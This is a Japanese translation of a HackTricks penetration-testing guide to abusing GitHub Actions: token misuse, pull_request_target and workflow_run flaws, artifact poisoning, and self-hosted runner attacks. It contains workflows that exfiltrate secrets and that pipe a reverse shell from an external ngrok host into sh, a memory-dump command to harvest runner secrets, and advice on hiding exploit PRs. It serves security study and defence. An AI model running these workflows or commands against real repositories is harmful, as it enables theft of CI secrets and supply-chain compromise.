# Github Actionsの乱用

<details>

<summary><strong>HackTricksをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝**したい場合や、**最新バージョンのPEASSやHackTricksのPDFをダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを楽しむ
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**でフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## 基本情報

このページでは以下の情報を見つけることができます：

* 攻撃者がGithub Actionにアクセスできた場合の**影響の要約**
* アクションにアクセスするための**さまざまな方法**：
* アクションを作成するための**権限**を持つ
* **プルリクエスト**関連のトリガーを乱用する
* 他の外部アクセス**技術を乱用する**
* すでに侵害されたリポジトリから**ピボット**する
* 最後に、**内部からアクションを乱用するための事後エクスプロイト技術**についてのセクション（前述の影響を引き起こす）

## 影響の要約

[**Github Actionsについての基本情報をチェック**](../basic-github-information.md#github-actions)してください。

もしリポジトリで**任意のGithubアクション/コードを注入**できる場合、以下のことができるかもしれません：

* そのリポジトリ/組織から**シークレット**を**盗む**ことができます。
* 注入のみ可能な場合、ワークフローに既に存在するものを盗むことができます。
* AWSやGCPなどの他のプラットフォームへのアクセス権を**乱用**することができます。
* カスタムワーカー（カスタムワーカーが使用されている場合）で**コードを実行**し、そこからピボットを試みることができます。
* リポジトリの**コードを上書き**することができます。
* これは`GITHUB_TOKEN`の権限に依存します（存在する場合）。
* **デプロイメント**や他の**アーティファクト**を**侵害**することができます。
* コードが何かをデプロイまたは保存している場合、それを変更してさらなるアクセスを得ることができます。

## GITHUB\_TOKEN

この「**シークレット**」（`${{ secrets.GITHUB_TOKEN }}`および`${{ github.token }}`から取得）は、管理者がこのオプションを有効にした場合に与えられます：

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

このトークンは、**Githubアプリケーションが使用する**ものと同じですので、同じエンドポイントにアクセスできます：[https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Githubは、リポジトリが`GITHUB_TOKEN`を使用して他の内部リポジトリにアクセスできるようにする[**フロー**](https://github.com/github/roadmap/issues/74)をリリースするべきです。
{% endhint %}

このトークンの可能な**権限**は次のとおりです：[https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

このトークンは、ジョブが完了した後に**期限切れになります**。\
このトークンは次のようになります：`ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

このトークンでできる興味深いこと：

{% tabs %}
{% tab title="PRのマージ" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% tab title="PRの承認" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PRの作成" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
いくつかの場合、Github Actionsのenvsやsecrets内に**githubユーザートークンが見つかることがあります**。これらのトークンは、リポジトリや組織に対してより多くの特権を与える可能性があります。
{% endhint %}

<details>

<summary>Github Actionの出力でシークレットをリストアップする</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>シークレットを使用してリバースシェルを取得する</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

他のユーザーのリポジトリで与えられたGithubトークンの権限を確認するためには、アクションのログをチェックすることができます。

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## 実行の許可

{% hint style="info" %}
これはGithubアクションを侵害する最も簡単な方法であり、この場合は組織内で**新しいリポジトリを作成する権限**があるか、**リポジトリに対する書き込み権限**があることを前提としています。

このシナリオに該当する場合は、[ポストエクスプロイテーションテクニック](./#post-exploitation-techniques-from-inside-an-action)をチェックするだけで済みます。
{% endhint %}

### リポジトリ作成からの実行

組織のメンバーが**新しいリポジトリを作成**でき、Githubアクションを実行できる場合、**新しいリポジトリを作成し、組織レベルで設定されたシークレットを盗む**ことができます。

### 新しいブランチからの実行

既にGithubアクションが設定されているリポジトリで**新しいブランチを作成**できる場合、それを**変更**し、**内容をアップロード**し、そのアクションを**新しいブランチから実行**することができます。これにより、リポジトリと組織レベルのシークレットを**外部に持ち出す**ことができます（ただし、それらがどのように呼ばれるかを知る必要があります）。

変更されたアクションを**手動で実行**することもできますし、**PRが作成されたとき**や**コードがプッシュされたとき**にも実行することができます（どれくらい騒々しいかによります）。
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## フォークされた実行

{% hint style="info" %}
攻撃者が**別のリポジトリのGithubアクションを実行**することを可能にするさまざまなトリガーがあります。これらのトリガブルなアクションが適切に構成されていない場合、攻撃者はそれらを侵害することができます。
{% endhint %}

### `pull_request`

ワークフロートリガー**`pull_request`**は、プルリクエストが受信されるたびにワークフローを実行しますが、いくつかの例外があります。デフォルトでは、**初めて**共同作業を行う場合、いくつかの**メンテナー**がワークフローの実行を**承認**する必要があります。

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
デフォルトの制限は**初めて**の貢献者向けですので、有効なバグ/タイポを修正してから、新しい`pull_request`の特権を悪用するために**他のPRを送信**することができます。

**これをテストしましたが、うまくいきませんでした**：~~別のオプションとして、プロジェクトに貢献した人の名前でアカウントを作成し、そのアカウントを削除することです。~~
{% endhint %}

さらに、デフォルトでは、[**ドキュメント**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)で説明されているように、ターゲットリポジトリへの書き込み権限とシークレットへのアクセスが制限されます。

> `GITHUB_TOKEN`を除いて、**シークレットはフォークされた**リポジトリからワークフローがトリガーされたときにランナーに渡されません。**`GITHUB_TOKEN`は、フォークされたリポジトリからのプルリクエストに対して読み取り専用の権限**を持ちます。

攻撃者はGithubアクションの定義を変更して任意の操作を実行し、任意のアクションを追加することができます。ただし、上記の制限のため、シークレットを盗むことやリポジトリを上書きすることはできません。

{% hint style="danger" %}
**はい、攻撃者がPRでトリガーされるGithubアクションを変更した場合、彼のGithubアクションが使用され、元のリポジトリのものは使用されません！**
{% endhint %}

攻撃者は実行されるコードも制御しているため、`GITHUB_TOKEN`にシークレットや書き込み権限がなくても、例えば**悪意のあるアーティファクトをアップロード**することができます。

### **`pull_request_target`**

ワークフロートリガー**`pull_request_target`**は、ターゲットリポジトリに**書き込み権限**と**シークレットへのアクセス**を持ちます（許可を求めません）。

ワークフロートリガー**`pull_request_target`**は、PRで与えられたコンテキストではなく、**ベースのコンテキスト**で実行されます（**信頼できないコードを実行しないため**）。`pull_request_target`についての詳細は、[**ドキュメント**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target)を参照してください。\
また、この特定の危険な使用方法についての詳細については、この[**githubブログ記事**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)を参照してください。

**実行されるワークフロー**がPRで定義されたものではなく、**ベース**で定義されたものであるため、**`pull_request_target`**を使用することは**安全**に見えるかもしれませんが、いくつかの**ケースではそうではありません**。

そして、これには**シークレットへのアクセス**があります。

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run)トリガーは、`completed`、`requested`、または`in_progress`のいずれかの状態で別のワークフローを実行することを可能にします。

この例では、「Run Tests」という別のワークフローが完了した後にワークフローが実行されるように構成されています：
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
さらに、ドキュメントによると、`workflow_run` イベントによって開始されたワークフローは、**以前のワークフローがなくてもシークレットにアクセスし、トークンを書き込むことができます**。

この種のワークフローは、外部ユーザーによって **`pull_request`** または **`pull_request_target`** を介してトリガーされる可能性のあるワークフローに依存している場合、攻撃の対象になる可能性があります。脆弱な例は、[**このブログ**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability) で見つけることができます。最初の例では、**`workflow_run`** がトリガーされたワークフローが攻撃者のコードをダウンロードしています: `${{ github.event.pull_request.head.sha }}`\
2番目の例では、**信頼できない**コードから**アーティファクト**を**`workflow_run`** ワークフローに渡し、このアーティファクトの内容を使用してRCEの脆弱性を引き起こす方法があります。

### `workflow_call`

TODO

TODO: pull\_request から実行された場合、使用される/ダウンロードされるコードは、元のリポジトリからのものかフォークされた PR からのものかを確認する

## フォークされた実行の悪用

外部の攻撃者がGitHubワークフローを実行する方法についてはすべて説明しましたが、悪意のある実行が誤って構成されている場合、どのように悪用されるかについて見てみましょう。

### 信頼できないチェックアウトの実行

**`pull_request`** の場合、ワークフローは**PRのコンテキストで実行**されます（したがって、**悪意のあるPRのコード**が実行されます）、ただし、最初に**承認する必要があり**、いくつかの[制限](./#pull\_request)で実行されます。

**`pull_request_target` または `workflow_run`** を使用して **`pull_request_target` または `pull_request`** からトリガーできるワークフローに依存するワークフローの場合、元のリポジトリのコードが実行されますので、**攻撃者は実行されるコードを制御することはできません**。

{% hint style="danger" %}
ただし、**アクション**には**明示的なPRのチェックアウト**がある場合、**PRのコード**（ベースではなく）を**取得する**ことになります。例えば（PRのコードがダウンロードされる行12を確認してください）：
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

潜在的に**信頼できないコードは、`npm install` または `npm build` の実行中に実行**されます。ビルドスクリプトと参照される**パッケージは、PRの作成者によって制御されます**。

{% hint style="warning" %}
脆弱なアクションを検索するためのGitHubのドークは、`event.pull_request pull_request_target extension:yml` ですが、アクションが安全に実行されるようにジョブを構成するさまざまな方法があります（PRを生成するアクターに関する条件分岐など）。
{% endhint %}

### コンテキストスクリプトのインジェクション <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

一部の[**GitHubコンテキスト**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context)の値は、PRを作成する**ユーザーによって制御**されることに注意してください。GitHubアクションがそのデータを使用して何かを実行する場合、**任意のコードの実行**につながる可能性があります。

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV スクリプトインジェクション** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

ドキュメントによると、環境変数を定義または更新し、これを **`GITHUB_ENV`** 環境ファイルに書き込むことで、ワークフロージョブの後続のステップで環境変数を利用できるようにすることができます。

攻撃者がこの **env** 変数に任意の値を**インジェクト**できれば、**LD\_PRELOAD** や **NODE\_OPTIONS** などの後続のステップでコードを実行することができる環境変数をインジェクトすることができます。

例えば（[**こちら**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) と [**こちら**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)）、アップロードされたアーティファクトを信頼してその内容を **`GITHUB_ENV`** 環境変数に格納するワークフローを想像してください。攻撃者は次のようなものをアップロードして侵害することができます：

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### 脆弱なサードパーティのGithubアクション

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**このブログ記事**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) で説明されているように、このGithubアクションは異なるワークフローやリポジトリからアーティファクトにアクセスすることができます。

問題は、**`path`** パラメータが設定されていない場合、アーティファクトが現在のディレクトリに展開され、後続のワークフローで使用されるファイルを上書きする可能性があることです。したがって、アーティファクトが脆弱である場合、攻撃者はアーティファクトを信頼している他のワークフローを侵害するためにこれを悪用することができます。

脆弱なワークフローの例：
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
このワークフローでは、次のような攻撃が行われる可能性があります：
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## その他の外部アクセス

### 削除された名前空間リポジトリの乗っ取り

アカウントが名前を変更すると、一定時間後に別のユーザーが同じ名前のアカウントを登録することができます。リポジトリが名前の変更前に**100個未満のスター**を持っていた場合、Githubは同じ名前の新規登録ユーザーが削除されたリポジトリと同じ名前の**リポジトリを作成**することを許可します。

{% hint style="danger" %}
したがって、アクションが存在しないアカウントのリポジトリを使用している場合、攻撃者はそのアカウントを作成し、アクションを侵害する可能性があります。
{% endhint %}

他のリポジトリがこのユーザーのリポジトリから**依存関係を使用**している場合、攻撃者はそれらを乗っ取ることができます。詳細な説明はこちらをご覧ください：[https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## リポジトリのピボット

{% hint style="info" %}
このセクションでは、最初のリポジトリに何らかのアクセス権があると仮定して、**別のリポジトリにピボット**するための技術について説明します（前のセクションを確認してください）。
{% endhint %}

### キャッシュの改ざん

キャッシュは、**同じブランチでのワークフローの実行間**で維持されます。つまり、攻撃者がキャッシュに保存され、より特権のあるワークフローによって**ダウンロード**および実行される**パッケージ**を**侵害**すると、そのワークフローも**侵害**される可能性があります。

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### アーティファクトの改ざん

ワークフローは、他のワークフローやリポジトリから**アーティファクトを使用**することができます。攻撃者が後で別のワークフローで使用される**アーティファクトをアップロード**するGithubアクションを**侵害**すると、他のワークフローも**侵害**される可能性があります。

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## アクションからのポストエクスプロイテーション

### OIDCを介したAWSおよびGCPへのアクセス

以下のページを参照してください：

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### シークレットへのアクセス <a href="#accessing-secrets" id="accessing-secrets"></a>

スクリプトにコンテンツを注入する場合、シークレットにアクセスする方法を知ることが重要です：

* シークレットまたはトークンが**環境変数**に設定されている場合、**`printenv`**を使用して環境から直接アクセスできます。

<details>

<summary>Githubアクションの出力にシークレットをリストする</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>シークレットを使用してリバースシェルを取得する</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* シークレットが**直接式で使用**される場合、生成されたシェルスクリプトは**ディスク上に保存**され、アクセス可能です。
* ```bash
cat /home/runner/work/_temp/*
```
* JavaScriptアクションの場合、シークレットは環境変数を介して送信されます。
* ```bash
ps axe | grep node
```
* **カスタムアクション**の場合、プログラムが**引数**から取得したシークレットの使用方法によってリスクが異なります：

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### セルフホストランナーの乱用

**Githubインフラストラクチャ以外で実行されているGithubアクション**を見つける方法は、Githubアクションの設定yamlで**`runs-on: self-hosted`**を検索することです。

**セルフホスト**ランナーは、**追加の機密情報**や他の**ネットワークシステム**（ネットワーク内の脆弱なエンドポイント？メタデータサービス？）にアクセスできる場合があります。また、**分離されて破棄されている場合でも、複数のアクションが同時に実行**される可能性があり、悪意のあるアクションが他のアクションのシークレットを**盗む**ことができます。

セルフホストランナーでは、**_Runner.Listener_プロセス**からシークレットを取得することも可能であり、そのメモリをダンプすることでワークフローのどのステップでもすべてのシークレットを含んでいます：

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

詳細については、[**この記事**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/)を参照してください。

### Github Dockerイメージレジストリ

Githubアクションを使用して、DockerイメージをビルドしてGithub内に保存することができます。\
以下の展開された例を参照してください。

<details>

<summary>GithubアクションでDockerイメージをビルドしてプッシュする</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

以前のコードでわかるように、Githubのレジストリは**`ghcr.io`**にホストされています。

リポジトリに読み取り権限を持つユーザーは、パーソナルアクセストークンを使用してDockerイメージをダウンロードすることができます。
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
次に、ユーザーは**Dockerイメージのレイヤーで漏洩したシークレットを検索**することができます：

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actionsログの中の機密情報

**Github**は、アクションログの中のシークレット値を検出し、表示を避けるようにしていますが、アクションの実行中に生成された他の機密データは隠されません。たとえば、シークレット値で署名されたJWTは、[特に設定されていない限り](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)隠されません。

## 自分の足跡を隠す

（[**ここ**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)の技術）まず、GitHubでは、公開されたPRは一般に表示されます。GitHubでは、デフォルトで**インターネット上のPRを削除することはできません**が、ひとつ注意があります。GitHubによって**停止された**アカウントの場合、そのアカウントの**すべてのPRが自動的に削除**され、インターネットから削除されます。したがって、自分の活動を隠すためには、**GitHubアカウントを停止させるか、アカウントをフラグ付けする**必要があります。これにより、GitHub上のすべての活動がインターネットから隠されます（基本的にはすべての悪用PRを削除します）。

GitHubの組織は、アカウントをGitHubに報告することに非常に積極的です。ただし、問題に「何か」を共有するだけで、彼らは12時間以内にアカウントを停止することを確実にします :p そして、そこで、GitHub上のあなたの悪用が見えなくなります。

{% hint style="warning" %}
組織が標的にされたことを知る唯一の方法は、GitHubのSIEMからログを確認することです。GitHubのUIからはPRが削除されるためです。
{% endhint %}

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **ハックトリックスで会社を宣伝**したい場合や、**PEASSの最新バージョンにアクセス**したい場合、または**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をご覧ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出**してください。

</details>
